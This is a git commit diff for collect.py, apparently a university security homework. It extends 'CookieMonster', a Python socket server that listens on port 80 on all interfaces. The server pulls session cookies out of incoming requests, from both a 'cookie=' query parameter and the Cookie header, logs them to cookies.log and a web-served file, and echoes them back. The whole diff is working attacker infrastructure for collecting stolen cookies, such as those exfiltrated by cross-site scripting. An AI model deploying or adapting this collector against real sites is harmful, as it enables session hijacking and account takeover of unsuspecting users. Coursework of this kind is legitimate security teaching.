7b51f5160fd6aa7a2e6fdd6458e1d4ddfd33bd5d
Andrew Helgeson <helge206@umn.edu>
2012-11-18 20:15:38 -0800

    added features to the collector

--- hw2/q3/collect.py
+++ hw2/q3/collect.py
@@ -1,18 +1,24 @@
 #!/usr/bin/python
 
 import re
+import os
 import sys
 import threading
 import SocketServer
 
-address='192.169.1.1'
-address_local='localhost'
+address='0.0.0.0'
 port = 80
 
 cookie_re_raw='cookie=(.+?) HTTP/1.[0|1]'
+cookie2_re_raw='Cookie: (.+)'
 cookie_re = re.compile(cookie_re_raw)
+cookie2_re = re.compile(cookie2_re_raw)
 
 cookie_jar = "cookies.log"
+collector_log="/var/www/collector_log.txt"
+
+log = None
+log_length = 0
 
 class CookieMonster(SocketServer.BaseRequestHandler):
   def __init__(self, request, client_address, server):
@@ -25,18 +31,25 @@ class CookieMonster(SocketServer.BaseRequestHandler):
   def handle(self):
     data = self.request.recv(2048)
     print("Received data:\n{}".format(data))
+    sendToLog("\n=============\nReceived data:\n{}\n".format(data))
 
     m = cookie_re.search(data)
+    if m is None:
+      m = cookie2_re.search(data)
+
     cookie = "no cookie"
     if m is None:
       print("No cookie provided in request")
+      sendToLog("No cookie found in request\n")
       self.request.send("no cookies :(\n")
     else:
       with open(cookie_jar, "a") as f:
-        print("Cookie found in request!")
-        print("cookie: {}".format(m.group(1)))
-        f.write("{}\n".format(m.group(1)))
         cookie = m.group(1)
+        print("Cookie found in request!")
+        sendToLog("Cookie found in request!\n")
+        print("cookie: {}".format(cookie))
+        sendToLog("cookie: {}\n".format(cookie))
+        f.write("{}\n".format(cookie))
 
     self.request.send(cookie + "\n")
     return
@@ -44,19 +57,37 @@ class CookieMonster(SocketServer.BaseRequestHandler):
   def finish(self):
     return SocketServer.BaseRequestHandler.finish(self)
 
+
+def sendToLog(txt):
+  global log_length
+
+  if log is None:
+    return
+
+  if log_length == 10:
+    log.truncate()
+    log_length = 0
+
+  log.write(txt)
+  log.flush()
+  os.fsync(log)
+
+  log_length += 1
+
 if __name__ == '__main__':
   if len(sys.argv) > 1:
     port = int(sys.argv[1])
 
-  print("Starting collector on (addr={}, port={})".format(address, port))
+  try:
+    log = open(collector_log, "w+")
+  except Exception as e:
+    print("Failed to open the collector log")
 
+  print("Starting collector on (addr={}, port={})".format(address, port))
+  sendToLog("Starting collector on (addr={}, port={})\n".format(address,port))
   # Listen on the external interface
   server = SocketServer.TCPServer((address, port), CookieMonster)
-  t = threading.Thread(target=server.serve_forever)
-  t.setDaemon(True)
-  t.start()
-
-  print("Starting collector on (addr={}, port={})".format(address_local, port))
-  # Listen on localhost
-  server = SocketServer.TCPServer((address_local, port), CookieMonster)
   server.serve_forever()
+  #t = threading.Thread(target=server.serve_forever)
+  #t.setDaemon(True)
+  #t.start()
